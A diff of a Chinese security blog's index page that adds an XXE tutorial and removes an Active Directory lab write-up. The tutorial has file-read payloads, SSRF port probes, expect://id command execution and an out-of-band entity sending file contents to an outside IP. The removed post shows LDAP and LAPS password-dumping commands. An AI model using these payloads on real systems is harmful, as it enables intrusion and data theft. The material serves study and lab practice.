@@ -72,7 +72,7 @@
       </a>
 
     
-      <a title="关于我"  alt="关于我"  v-for="(menu,index) in menus" href="https://twe1ve-web.github.io/about/index">
+      <a title="关于我"  alt="关于我"  v-for="(menu,index) in menus" href="./../about">
         <div class="icon"><i class="iconfont icon-about"></i></div>
         <div class="name">
           <div class="cnname">关于我</div>
@@ -114,6 +114,179 @@
     </div>
     <!--主页上右部分-->
     
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" class="title">XXE漏洞详解</a>
+    <section class="desc">
+  0x01、XXE原理：XXE：XML External Entity Injection；即XML外部实体注入（php版本大于5.4.45的默认不解析外部实体）
+1、XML：Extensible Markup Language，可扩展标记基础XML被设计用来结构化、存储以及传输信息，且XML 允许创作者定义自己的标签和自己的文档结构。XML的构建模块结构如下：
+
+XML元素
+
+属性
+
+实体     
+
+
+以一个简单的XXE POC为例：
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  ###XML声明
+&lt;!DOCTYPE test [                                ####文档类型定义（DTD）
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;     ###定义实体名
+]&gt;
+&lt;test&gt;&amp;xxe;&lt;/test&gt;   ###文档元素，使用实体名2.DTD（文档类型定义）实体
+定义XML文件中有哪些模块，这些模块能包含什么样的内容
+
+DTD可以在XML文档内声明，也可以外部引用
+
+
+内部声明DTD：
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [        定义此文档是 note 类型的文档。
+&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;
+ &lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型
+  &lt;!ELEMENT from    (#PCDATA)&gt;     
+  &lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body    (#PCDATA)&gt;
+]&gt;
+&lt;note&gt;
+ &lt;to&gt;George&lt;/to&gt;
+  &lt;from&gt;John&lt;/from&gt;
+  &lt;heading&gt;Reminder&lt;/heading&gt;
+  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt;引用外部DTD：
+DTD文件内容：
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;
+&lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型
+&lt;!ELEMENT from    (#PCDATA)&gt;     
+&lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body    (#PCDATA)&gt;引用DTD：
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE root SYSTEM &quot;http://xx.xx.xx.xx/evil.dtd&quot;&gt;
+&lt;note&gt;
+  &lt;to&gt;George&lt;/to&gt;
+  &lt;from&gt;John&lt;/from&gt;
+  &lt;heading&gt;Reminder&lt;/heading&gt;
+  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;
+&lt;/note&gt;
+ELEMENT被过滤的情况下，可以将ELEMENT写入到DTD，外部引用;或外带查询
+
+3、为什么能形成注入？XML 外部实体可以解析外部文件的特性，使得攻击成为可能；当XML允许引用外部实体，关键字“SYSTEM”会令XML解析器从URI中读取内容，并允许它在XML文档中被替换简单的漏洞代码：
+&lt;?php
+libxml_disable_entity_loader (false);
+$xmlfile = file_get_contents(&apos;php://input&apos;);
+$dom = new DOMDocument();
+
+# LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值
+# LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+$creds = simplexml_import_dom($dom);
+$user = $creds-&gt;user;
+$pass = $creds-&gt;pass;
+#回显信息
+  echo &quot;You have logged in as user $user&quot;;
+###漏洞触发点在user元素中
+?&gt;0x02、XXE漏洞验证：如上漏洞代码poc，paylaod.txt：
+&lt;creds&gt;
+&lt;user&gt; Ed &lt;/user&gt;
+&lt;pass&gt; mypass &lt;/pass&gt;
+&lt;/creds&gt;
+tips：读php或html文件时：（由于带有&lt; , &gt;符号会导致解析错误，使用如下paylaod）
+
+&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/xx.php&quot;&gt;curl验证：
+curl -d @payload.txt http://localhost/xml_injectable.php显然这里是有回显的情况，无回显判断，一般还会监听一下我们的80端口是否收到对方的访问信息
+
+0x03、XXE能做什么：[1]文件读取
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot; &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;
+[2]SSRF探测端口内网服务
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/&quot; &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;
+尝试在XXE漏洞代码中加入：    error_reporting(0);
+
+上边这个判断方法比较依赖于对方开启报错并回显；有回显但没有开启报错的情况下可以根据响应时间/长度，判断该端口是否已被开启（时间差还是很明显的）
+[3]Bind XXE （OOB）外带数据（无回显攻击）
+[代码中注释掉 echo “You have logged in as user $user”;]
+OOB  文件读取
+evil.dtd：
+&lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &apos;http://47.112.182.89/%file;&apos;&gt;&quot;&gt;payload.txt(按理说是读取php或者html文件才需要base64，可是我这里不经过base是没有信息返回的)
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE data [
+&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=C://windows//system.ini&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;
+%dtd; %all;
+]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;
+OOB  探测内网端口及服务：
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE data [
+&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:3389&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;
+%dtd; %all;
+]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;0x04、攻击内网SSRF+内网服务命令执行实现内网攻击
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/ssrf.php?cmd=xxxxxxx&quot; &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;系统命令执行
+(PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上时才可用)
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;0x05、使用递归实体扩展进行DOS攻击
+0x06、XXE漏洞挖掘： 如何判断是否存在XML外部实体攻击?那就是寻找那些接受XML作为输入内容的端点，而有些端点可能并不是那么明显，比如一些仅使用JSON去访问服务的客户端，可以通过修改HTTP的请求或修改Content-Type头部字段等方法，然后看应用程序的响应，看程序是否解析了发送的内容，如果解析了，那么就可能存在XXE攻击漏洞
+比如这个案例：https://www.freebuf.com/vuls/167087.html ；通过更改contentn type类型值来fuzz目标是否能够正常响应XML值
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+foo=bar等价于：（一般WAF只会拦截application/x-www-form-urlencoded，通过更改为其他类型如text/xml 或 application/xml可绕过 ）
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;1.文件上传XXE（XML、XLSX，DOCX，PPTX，SVG或任何XML MIME类型格式）
+2.传输内容XXE （支持XML）
+扩展之Json端点上的XXE：
+原始JSON
+{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}XML转换(需要添加一个根元素，不然会成为无效的XML文档)
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;root&gt;
+&lt;search&gt;name&lt;/search&gt;
+&lt;value&gt;netspitest&lt;/value&gt;
+&lt;/root&gt;以HTB Fulcrum为例：疑似一个API返回一段json信息，但是我们没有能够与API进行交互的方法，只能尝试各种可能（OS[系统命令注入]、sqli、xxe、xpath等）
+
+成功验证XXE
+
+
+
+</section>
+    <p class="sub">Apr 26, 2020</p>
+  </div>
+</div>-->
 <!---->
 <!--  <div class="project-card">
   
@@ -481,56 +654,9 @@ http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%
   </div>
 </div>-->
 <!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/" class="title">域渗透之AD Recyle Bin组利用+Ldaps信息枚举</a>
-    <section class="desc">
-  AD Recyle Bin组利用：使用回收站还原用户，或获取用户旧密码进行碰撞
-前提,需要域内启用回收站功能，且用户在AD Recyle Bin 组中
-未启用启用回收站和启用回收站删除对象对比
-图1：启用回收站之前已删除的Active Directory对象的生命周期
-
-图2：启用回收站后已删除的Active Directory对象的生命周期
-
-启用AD回收站：
-Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’查看删除用户
-Get-ADObject -filter &apos;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&apos; -includeDeletedObjects结果示例：
-Deleted           : True
-DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
-Name              : TempAdmin
-                DEL:f0cc344d-31e0-4866-bceb-a842791ca059
-ObjectClass       : user
-ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059尝试还原已删除账户
-Restore-ADObject -Identity &apos;f0cc344d-31e0-4866-bceb-a842791ca059&apos;###使用ObjectGUID进行还原或
-Get-ADObject -Filter {displayName -eq  &quot;TempAdmin&quot;} IncludeDeletedObjects | Restore-ADObject查询ms-mcs-admpwd
-Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd  查看有关于特定账户的全部属性信息：
-Get-ADObject -Filter {displayName -eq &quot;TempAdmin&quot;} -IncludeDeletedObjects -Properties *  
-cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz如这里存在LegacyPassword（直接缓存的旧密码）名称被自定义，通过查看所有属性列出来
-Ldap枚举：获取基本的账户信息、密码ldapsearch 使用：列出基本的上下文信息
-kali@kali:$ ldapsearch -h 10.10.10.182 -D  cascade.local -x -s base namingcontexts提取整个域目录的数据，然后grep筛选输出：
-kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -s sub -b &quot;DC=cascade,DC=local&quot; |tee ldap.out
-root@kali:$ cat ldap.out |grep -i memberof筛选输出：
-kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascade,DC=local&quot; &apos;(objectClass=User)&apos; sAMAccountName sAMAccountType列出管理用户组
-kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascae,DC=local&quot; &apos;(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local)&apos; |grep -i memberofDump LAPS passwords:
-kali@kali:$ ldapsearch -h  -D cascade.local -x -b &quot;dc=cascade,dc=local&quot; &apos;(ms-MCS-AdmPwd=*)&apos; ms-MCS-AdmPwd同样windapsearch也是一个不错的工具
-kali@kali:$./windapsearch_py2.py  --dc-ip 10.10.10.182 -d cascade.local --full --users
-
-...
-user:r.thompson
-cascadeLegacyPwd: clk0bjVldmE=
-...https://github.com/snovvcrash/cheatsheets/tree/master 
-https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html 
-
-
-</section>
-    <p class="sub">Apr 26, 2020</p>
-  </div>
-</div>-->
-<!---->
 <!--
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
   </nav>
 
 -->
@@ -541,6 +667,194 @@ https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="XXE漏洞详解" alt="XXE漏洞详解" href="/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="XXE漏洞详解" alt="XXE漏洞详解"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; XXE漏洞详解 &gt;</div>
+                            <div class="content flex1">
+                                
+  0x01、XXE原理：XXE：XML External Entity Injection；即XML外部实体注入（php版本大于5.4.45的默认不解析外部实体）
+1、XML：Extensible Markup Language，可扩展标记基础XML被设计用来结构化、存储以及传输信息，且XML 允许创作者定义自己的标签和自己的文档结构。XML的构建模块结构如下：
+
+XML元素
+
+属性
+
+实体     
+
+
+以一个简单的XXE POC为例：
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  ###XML声明
+&lt;!DOCTYPE test [                                ####文档类型定义（DTD）
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;     ###定义实体名
+]&gt;
+&lt;test&gt;&amp;xxe;&lt;/test&gt;   ###文档元素，使用实体名2.DTD（文档类型定义）实体
+定义XML文件中有哪些模块，这些模块能包含什么样的内容
+
+DTD可以在XML文档内声明，也可以外部引用
+
+
+内部声明DTD：
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [        定义此文档是 note 类型的文档。
+&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;
+ &lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型
+  &lt;!ELEMENT from    (#PCDATA)&gt;     
+  &lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body    (#PCDATA)&gt;
+]&gt;
+&lt;note&gt;
+ &lt;to&gt;George&lt;/to&gt;
+  &lt;from&gt;John&lt;/from&gt;
+  &lt;heading&gt;Reminder&lt;/heading&gt;
+  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt;引用外部DTD：
+DTD文件内容：
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;
+&lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型
+&lt;!ELEMENT from    (#PCDATA)&gt;     
+&lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body    (#PCDATA)&gt;引用DTD：
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE root SYSTEM &quot;http://xx.xx.xx.xx/evil.dtd&quot;&gt;
+&lt;note&gt;
+  &lt;to&gt;George&lt;/to&gt;
+  &lt;from&gt;John&lt;/from&gt;
+  &lt;heading&gt;Reminder&lt;/heading&gt;
+  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;
+&lt;/note&gt;
+ELEMENT被过滤的情况下，可以将ELEMENT写入到DTD，外部引用;或外带查询
+
+3、为什么能形成注入？XML 外部实体可以解析外部文件的特性，使得攻击成为可能；当XML允许引用外部实体，关键字“SYSTEM”会令XML解析器从URI中读取内容，并允许它在XML文档中被替换简单的漏洞代码：
+&lt;?php
+libxml_disable_entity_loader (false);
+$xmlfile = file_get_contents(&apos;php://input&apos;);
+$dom = new DOMDocument();
+
+# LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值
+# LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+$creds = simplexml_import_dom($dom);
+$user = $creds-&gt;user;
+$pass = $creds-&gt;pass;
+#回显信息
+  echo &quot;You have logged in as user $user&quot;;
+###漏洞触发点在user元素中
+?&gt;0x02、XXE漏洞验证：如上漏洞代码poc，paylaod.txt：
+&lt;creds&gt;
+&lt;user&gt; Ed &lt;/user&gt;
+&lt;pass&gt; mypass &lt;/pass&gt;
+&lt;/creds&gt;
+tips：读php或html文件时：（由于带有&lt; , &gt;符号会导致解析错误，使用如下paylaod）
+
+&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/xx.php&quot;&gt;curl验证：
+curl -d @payload.txt http://localhost/xml_injectable.php显然这里是有回显的情况，无回显判断，一般还会监听一下我们的80端口是否收到对方的访问信息
+
+0x03、XXE能做什么：[1]文件读取
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot; &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;
+[2]SSRF探测端口内网服务
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/&quot; &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;
+尝试在XXE漏洞代码中加入：    error_reporting(0);
+
+上边这个判断方法比较依赖于对方开启报错并回显；有回显但没有开启报错的情况下可以根据响应时间/长度，判断该端口是否已被开启（时间差还是很明显的）
+[3]Bind XXE （OOB）外带数据（无回显攻击）
+[代码中注释掉 echo “You have logged in as user $user”;]
+OOB  文件读取
+evil.dtd：
+&lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &apos;http://47.112.182.89/%file;&apos;&gt;&quot;&gt;payload.txt(按理说是读取php或者html文件才需要base64，可是我这里不经过base是没有信息返回的)
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE data [
+&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=C://windows//system.ini&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;
+%dtd; %all;
+]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;
+OOB  探测内网端口及服务：
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE data [
+&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:3389&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;
+%dtd; %all;
+]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;0x04、攻击内网SSRF+内网服务命令执行实现内网攻击
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/ssrf.php?cmd=xxxxxxx&quot; &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;系统命令执行
+(PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上时才可用)
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;0x05、使用递归实体扩展进行DOS攻击
+0x06、XXE漏洞挖掘： 如何判断是否存在XML外部实体攻击?那就是寻找那些接受XML作为输入内容的端点，而有些端点可能并不是那么明显，比如一些仅使用JSON去访问服务的客户端，可以通过修改HTTP的请求或修改Content-Type头部字段等方法，然后看应用程序的响应，看程序是否解析了发送的内容，如果解析了，那么就可能存在XXE攻击漏洞
+比如这个案例：https://www.freebuf.com/vuls/167087.html ；通过更改contentn type类型值来fuzz目标是否能够正常响应XML值
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+foo=bar等价于：（一般WAF只会拦截application/x-www-form-urlencoded，通过更改为其他类型如text/xml 或 application/xml可绕过 ）
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;1.文件上传XXE（XML、XLSX，DOCX，PPTX，SVG或任何XML MIME类型格式）
+2.传输内容XXE （支持XML）
+扩展之Json端点上的XXE：
+原始JSON
+{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}XML转换(需要添加一个根元素，不然会成为无效的XML文档)
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;root&gt;
+&lt;search&gt;name&lt;/search&gt;
+&lt;value&gt;netspitest&lt;/value&gt;
+&lt;/root&gt;以HTB Fulcrum为例：疑似一个API返回一段json信息，但是我们没有能够与API进行交互的方法，只能尝试各种可能（OS[系统命令注入]、sqli、xxe、xpath等）
+
+成功验证XXE
+
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="调用API绕过杀软添加用户" alt="调用API绕过杀软添加用户" href="/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/"
                        class="post-item swiper-slide flex flex-v">
@@ -1028,68 +1342,6 @@ https://blog.csdn.net/qq_36374896/article/details/84261516
 https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html 
 https://www.jianshu.com/p/907c6aab6fd0
 http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf
-
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" alt="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" href="/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" alt="域渗透之AD Recyle Bin组利用+Ldaps信息枚举"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; 域渗透之AD Recyle Bin组利用+Ldaps信息枚举 &gt;</div>
-                            <div class="content flex1">
-                                
-  AD Recyle Bin组利用：使用回收站还原用户，或获取用户旧密码进行碰撞
-前提,需要域内启用回收站功能，且用户在AD Recyle Bin 组中
-未启用启用回收站和启用回收站删除对象对比
-图1：启用回收站之前已删除的Active Directory对象的生命周期
-
-图2：启用回收站后已删除的Active Directory对象的生命周期
-
-启用AD回收站：
-Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’查看删除用户
-Get-ADObject -filter &apos;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&apos; -includeDeletedObjects结果示例：
-Deleted           : True
-DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
-Name              : TempAdmin
-                DEL:f0cc344d-31e0-4866-bceb-a842791ca059
-ObjectClass       : user
-ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059尝试还原已删除账户
-Restore-ADObject -Identity &apos;f0cc344d-31e0-4866-bceb-a842791ca059&apos;###使用ObjectGUID进行还原或
-Get-ADObject -Filter {displayName -eq  &quot;TempAdmin&quot;} IncludeDeletedObjects | Restore-ADObject查询ms-mcs-admpwd
-Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd  查看有关于特定账户的全部属性信息：
-Get-ADObject -Filter {displayName -eq &quot;TempAdmin&quot;} -IncludeDeletedObjects -Properties *  
-cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz如这里存在LegacyPassword（直接缓存的旧密码）名称被自定义，通过查看所有属性列出来
-Ldap枚举：获取基本的账户信息、密码ldapsearch 使用：列出基本的上下文信息
-kali@kali:$ ldapsearch -h 10.10.10.182 -D  cascade.local -x -s base namingcontexts提取整个域目录的数据，然后grep筛选输出：
-kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -s sub -b &quot;DC=cascade,DC=local&quot; |tee ldap.out
-root@kali:$ cat ldap.out |grep -i memberof筛选输出：
-kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascade,DC=local&quot; &apos;(objectClass=User)&apos; sAMAccountName sAMAccountType列出管理用户组
-kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascae,DC=local&quot; &apos;(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local)&apos; |grep -i memberofDump LAPS passwords:
-kali@kali:$ ldapsearch -h  -D cascade.local -x -b &quot;dc=cascade,dc=local&quot; &apos;(ms-MCS-AdmPwd=*)&apos; ms-MCS-AdmPwd同样windapsearch也是一个不错的工具
-kali@kali:$./windapsearch_py2.py  --dc-ip 10.10.10.182 -d cascade.local --full --users
-
-...
-user:r.thompson
